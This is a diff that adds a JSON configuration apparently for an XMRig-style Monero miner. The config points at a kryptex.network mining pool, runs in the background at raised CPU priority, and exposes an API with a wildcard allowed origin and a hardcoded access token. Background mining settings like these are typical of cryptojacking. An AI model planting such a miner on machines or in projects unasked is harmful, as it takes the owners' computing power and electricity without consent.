@@ -1,0 +1,34 @@
+{
+      "autosave": true,
+      "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "priority": 3,
+        "cache": true,
+        "asm": true
+      },
+      "pools": [
+        {
+          "coin": "XMR",
+          "url": "xmr.kryptex.network:8029",
+          "user": "",
+          "pass": "x",
+          "donate-level": 0,
+          "keepalive": true,
+          "enabled": true,
+          "tls": true
+        }
+      ],
+      "donate-level": 0,
+      "background": true,
+      "http": {
+        "enabled": false,
+        "host": "0.0.0.0",
+        "port": 8028,
+        "access-token": "4fG7!kLm2@bV9#sZ6%dX1rT8*uQ3"
+      },
+      "api": {
+        "enabled": true,
+        "allow-origin": "*"
+      }
+    }
